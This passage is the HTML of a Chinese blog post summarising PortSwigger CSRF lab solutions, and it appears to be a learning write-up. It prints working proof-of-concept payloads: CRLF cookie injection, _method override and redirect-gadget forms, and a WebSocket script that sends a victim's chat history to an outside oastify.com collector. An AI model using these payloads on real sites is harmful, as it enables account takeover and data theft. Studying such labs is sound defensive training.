@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这篇文章以Portswigger官网的Lab来总结CSRF相关的知识点，CSRF的基础原理这里不再赘述，涉及到的浏览器基础知识主要是和Cookie相关，可以见Cookie安全属性。在做LAB的过程中也学到了很多以前没有注意到的知识点，下面就根据各个LAB来归纳总结。 LAB记录CSRF Token的设计缺陷 CSRF vulnerability with no defenses：不多说，对重要的表">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全之CSRF总结">
+<meta property="og:url" content="http://example.com/2025/02/27/font-security-csrf/index.html">
+<meta property="og:site_name" content="runt0">
+<meta property="og:description" content="这篇文章以Portswigger官网的Lab来总结CSRF相关的知识点，CSRF的基础原理这里不再赘述，涉及到的浏览器基础知识主要是和Cookie相关，可以见Cookie安全属性。在做LAB的过程中也学到了很多以前没有注意到的知识点，下面就根据各个LAB来归纳总结。 LAB记录CSRF Token的设计缺陷 CSRF vulnerability with no defenses：不多说，对重要的表">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250225152257889.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250225152407074.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250225154440616.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226103954309.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226103851683.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226122130641.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226122402088.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226122548742.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226125305170.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226140403617.png">
+<meta property="og:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250226151252761.png">
+<meta property="article:published_time" content="2025-02-27T03:12:31.000Z">
+<meta property="article:modified_time" content="2025-02-27T03:12:31.619Z">
+<meta property="article:author" content="runt0">
+<meta property="article:tag" content="前端安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/02/27/font-security-csrf/image-20250225152257889.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>前端安全之CSRF总结</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/02/24/font-security-basic/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/27/font-security-csrf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/27/font-security-csrf/&text=前端安全之CSRF总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/27/font-security-csrf/&is_video=false&description=前端安全之CSRF总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=前端安全之CSRF总结&body=Check out this article: http://example.com/2025/02/27/font-security-csrf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/27/font-security-csrf/&title=前端安全之CSRF总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/27/font-security-csrf/&name=前端安全之CSRF总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/27/font-security-csrf/&t=前端安全之CSRF总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LAB%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">LAB记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token%E7%9A%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-number">1.1.</span> <span class="toc-text">CSRF Token的设计缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CRLF%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84CSRF-Key"><span class="toc-number">1.2.</span> <span class="toc-text">利用CRLF注入重置受害者的CSRF Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-method%E5%8F%82%E6%95%B0%E9%87%8D%E5%86%99http%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">利用_method参数重写http方法绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">利用客户端重定向绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">利用其他子域名的漏洞绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4Lax%E7%AD%96%E7%95%A5%E5%9C%A8120s%E7%9A%84%E7%94%9F%E6%95%88%E6%9C%9F"><span class="toc-number">1.6.</span> <span class="toc-text">默认Lax策略在120s的生效期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer%E6%A0%A1%E9%AA%8C%E7%9A%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-number">1.7.</span> <span class="toc-text">Referer校验的设计缺陷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">知识总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">防御方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        前端安全之CSRF总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">runt0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-27T03:12:31.000Z" class="dt-published" itemprop="datePublished">27 02 2025</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" rel="tag">前端安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这篇文章以Portswigger官网的Lab来总结CSRF相关的知识点，CSRF的基础原理这里不再赘述，涉及到的浏览器基础知识主要是和Cookie相关，可以见<a target="_blank" rel="noopener" href="https://runt0.github.io/2025/02/24/font-security-basic/#Cookie%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7">Cookie安全属性</a>。在做LAB的过程中也学到了很多以前没有注意到的知识点，下面就根据各个LAB来归纳总结。</p>
+<h2 id="LAB记录"><a href="#LAB记录" class="headerlink" title="LAB记录"></a>LAB记录</h2><h3 id="CSRF-Token的设计缺陷"><a href="#CSRF-Token的设计缺陷" class="headerlink" title="CSRF Token的设计缺陷"></a>CSRF Token的设计缺陷</h3><ol>
+<li><p>CSRF vulnerability with no defenses：不多说，对重要的表单提交没有任何的防护。</p>
+</li>
+<li><p>CSRF where token validation depends on request method：使用CSRF Token作为表单的隐藏参数，但是在请求方法是GET的情况下没有进行校验。</p>
+</li>
+<li><p>CSRF where token validation depends on token being present：使用CSRF Token作为表单的隐藏参数，在CSRF Token参数不提交的情况下不进行校验。</p>
+</li>
+<li><p>CSRF where token is not tied to user session：使用CSRF Token作为表单的隐藏参数，但CSRF Token没有与用户会话进行绑定。这种情况可能是服务器全局维护一个Token集合，当校验时只要传入的Token在这个集合里就能通过校验，攻击者可以使用自己的Token进行攻击。</p>
+</li>
+</ol>
+<h3 id="利用CRLF注入重置受害者的CSRF-Key"><a href="#利用CRLF注入重置受害者的CSRF-Key" class="headerlink" title="利用CRLF注入重置受害者的CSRF Key"></a>利用CRLF注入重置受害者的CSRF Key</h3><p>这一类攻击手法主要是针对这样的场景，Cookie中单独设置了一个参数作为CSRF Token的Key，服务端根据传入的Key和对应的Token进行校验。同时可以利用CRLF注入设置受害者Cookie的方式来修改受害者的CSRF Key，所以归于一类</p>
+<ol start="5">
+<li>CSRF where token is tied to non-session cookie</li>
+</ol>
+<p>使用CSRF Token作为表单的隐藏参数，CSRF Token与另一个Cookie参数<code>csrfKey</code>绑定而不与用户会话绑定</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">csrf</span>=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</span></span><br></pre></td></tr></table></figure>
+
+<p>此时如果我们能控制受害者的<code>csrfKey</code>并且能知道对应的token就可以绕过限制。而浏览站点发现首页的搜索功能，会通过设置Cookie的形式将用户最后一次搜索的内容记录下来<img src="/2025/02/27/font-security-csrf/image-20250225152257889.png" alt="image-20250225152257889"></p>
+<p>测试后又发现此处存在CRLF注入，那么我们可以利用这一点来设置用户Cookie的方式来重新设置受害者的<code>csrfKey</code>，然后再使用攻击者的<code>csrf</code>参数构造表单：<img src="/2025/02/27/font-security-csrf/image-20250225152407074.png" alt="image-20250225152407074"></p>
+<p>最终的Payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0acb001104b2ee5bb50a2a7000b100a3.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qadadw<span class="symbol">&amp;#64;</span>normal<span class="symbol">&amp;#45;</span>user<span class="symbol">&amp;#46;</span>net&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nmVQti5HUpB1DLpIOJUkfJT2x82MV9m2&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0acb001104b2ee5bb50a2a7000b100a3.web-security-academy.net/?search=1%0d%0aSet-Cookie:+csrfKey=yCm51xchXXILGj9OkYRmgdzHn1LgZj0X;+SameSite=None&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者在点击恶意链接后，首先会通过<code>img</code>标签，触发CRLF注入将自身站点的Cookie参数<code>csrfKey</code>设置成攻击者的，同时包括<code>SameSite=None</code>，这样这个Cookie就会被允许跨站点提交；而由于这不是一个合法图片，之后会触发<code>onerror</code>方法，将第一个表单中的内容进行提交，十分的巧妙。</p>
+<ol start="6">
+<li>CSRF where token is duplicated in cookie</li>
+</ol>
+<p>在测试中发现，服务器是直接根据当前页面名为<code>csrf</code>的Cookie参数生成包含对应Token的表单页面，即token的内容完全复制cookie中的参数。所以假如能控制受害者Cookie参数，就等于能控制Token，这个LAB中仍然存在CRLF注入问题，所以攻击手法和上个LAB一样。<img src="/2025/02/27/font-security-csrf/image-20250225154440616.png" alt="image-20250225154440616"></p>
+<h3 id="利用-method参数重写http方法绕过"><a href="#利用-method参数重写http方法绕过" class="headerlink" title="利用_method参数重写http方法绕过"></a>利用<code>_method</code>参数重写http方法绕过</h3><ol start="7">
+<li>SameSite Lax bypass via method override</li>
+</ol>
+<p>在这个LAB中，Cookie设置了<code>Lax</code>属性，POST的方法无法携带Cookie，而导航类的GET方法可以。又因为有些Web框架支持通过<code>_method</code>参数覆写http请求方法，所以可以用一条URL构造非GET方法的HTTP请求，POC如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当受害者点击链接后，页面将受害者导航至修改邮箱的页面并携带Cookie，同时利用URL参数<code>_method</code>将HTTP请求方法设置成POST，从而完成CSRF攻击</p>
+<h3 id="利用客户端重定向绕过"><a href="#利用客户端重定向绕过" class="headerlink" title="利用客户端重定向绕过"></a>利用客户端重定向绕过</h3><ol start="8">
+<li>SameSite Strict bypass via client-side redirect</li>
+</ol>
+<p>SameSite值为Strict，这里的客户端跳转本质上来讲是一种可以用来重新构造HTTP请求的Gadget。在测试过程中发现，当提交任意评论后，会有一个<code>/post/comment/confirmation?postId=</code>的请求，然后在这个页面停留一会后页面会进行自动跳转。从<code>/resources/js/commentConfirmationRedirect.js</code>内可以看到实现原理，利用<code>postId</code>来动态生成跳转的地址，然后等待3秒后跳转，当然从数据包里也可测试出来。<img src="/2025/02/27/font-security-csrf/image-20250226103954309.png" alt="image-20250226103954309"></p>
+<p>于是思路就是：</p>
+<ul>
+<li><p>构造链接跳转到email修改页面：<code>/post/comment/confirmation?postId=../../../my-account/change-email</code></p>
+</li>
+<li><p>利用上一个Lab的技巧构造<code>_method</code>参数提交POST数据包从而进行修改：</p>
+<p><code>../../../my-account/change-email?email=JJBB%40normal-user.net&amp;submit=1&amp;_method=POST</code></p>
+</li>
+</ul>
+<p><img src="/2025/02/27/font-security-csrf/image-20250226103851683.png" alt="image-20250226103851683"></p>
+<p>所以完整的POC如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a0f00d8034c678882bbfc5100b200d0.web-security-academy.net/post/comment/confirmation&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#46;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#47;</span>my<span class="symbol">&amp;#45;</span>account<span class="symbol">&amp;#47;</span>change<span class="symbol">&amp;#45;</span>email<span class="symbol">&amp;#63;</span>email<span class="symbol">&amp;#61;</span>JJBB<span class="symbol">&amp;#37;</span>40normal<span class="symbol">&amp;#45;</span>user<span class="symbol">&amp;#46;</span>net<span class="symbol">&amp;amp;</span>submit<span class="symbol">&amp;#61;</span>1<span class="symbol">&amp;amp;</span><span class="symbol">&amp;#95;</span>method<span class="symbol">&amp;#61;</span>POST&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>表单中的postId其实就是将如下payload进行html编码的结果：</p>
+<p><code>../../../my-account/change-email?email=JJBB%40normal-user.net&amp;submit=1&amp;_method=POST</code></p>
+<h3 id="利用其他子域名的漏洞绕过"><a href="#利用其他子域名的漏洞绕过" class="headerlink" title="利用其他子域名的漏洞绕过"></a>利用其他子域名的漏洞绕过</h3><ol start="8">
+<li>SameSite Strict bypass via sibling domain</li>
+</ol>
+<p>这个LAB中存在一个WebSocket协议的聊天功能，这个地方使用Cookie进行会话记录，并且观察到在向Server发送READY状态后，服务器会返回当前身份的历史会话</p>
+<p><img src="/2025/02/27/font-security-csrf/image-20250226122130641.png" alt="image-20250226122130641"></p>
+<p>所以可以利用如下的POC进行攻击</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var ws = new WebSocket(&#x27;wss://0a2f00f4038f5e33801c215400c20028.web-security-academy.net/chat&#x27;);</span><br><span class="line">    ws.onopen = function() &#123;</span><br><span class="line">        ws.send(&quot;READY&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = function(event) &#123;</span><br><span class="line">        fetch(&#x27;https://ioaji2m8x451wesyk1ek4t1s0j6auaiz.oastify.com&#x27;, &#123;method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: event.data&#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但Cookie属性为<code>Strict</code>无法跨站提交</p>
+<p><img src="/2025/02/27/font-security-csrf/image-20250226122402088.png" alt="image-20250226122402088"></p>
+<p>但测试中发现资源文件的<code>Access-Control-Allow-Origin</code>头里有个兄弟域名，进去简单测试下发现存在反射性XSS，于是在这个页面构造CSRF POC，让受害者从这个页面提交请求。此时，</p>
+<ul>
+<li>业务服务器地址：0a2f00f4038f5e33801c215400c20028.web-security-academy.net</li>
+<li>兄弟域名地址：cms-0a2f00f4038f5e33801c215400c20028.web-security-academy.net</li>
+</ul>
+<p>而他们虽然不同源，但由于<code>Access-Control-Allow-Origin</code>的存在使得兄弟域名可以跨域发起HTTP请求；而由于他们的根域名一致，所以被浏览器视为SameSite，所以可以携带Cookie提交，从而达到CSRF的目的。<img src="/2025/02/27/font-security-csrf/image-20250226122548742.png" alt="image-20250226122548742"></p>
+<p>以下是最终的POC，即将上一步的WebSocket的POC URL编码后贴到反射型XSS参数处，再使用BurpSuite自带的模块生成CSRF POC即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://cms-0a2f00f4038f5e33801c215400c20028.web-security-academy.net/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>var<span class="symbol">&amp;#32;</span>ws<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#61;</span><span class="symbol">&amp;#32;</span>new<span class="symbol">&amp;#32;</span>WebSocket<span class="symbol">&amp;#40;</span><span class="symbol">&amp;apos;</span>wss<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>0a2f00f4038f5e33801c215400c20028<span class="symbol">&amp;#46;</span>web<span class="symbol">&amp;#45;</span>security<span class="symbol">&amp;#45;</span>academy<span class="symbol">&amp;#46;</span>net<span class="symbol">&amp;#47;</span>chat<span class="symbol">&amp;apos;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>ws<span class="symbol">&amp;#46;</span>onopen<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#61;</span><span class="symbol">&amp;#32;</span>function<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#123;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>ws<span class="symbol">&amp;#46;</span>send<span class="symbol">&amp;#40;</span><span class="symbol">&amp;quot;</span>READY<span class="symbol">&amp;quot;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#125;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#32;</span><span 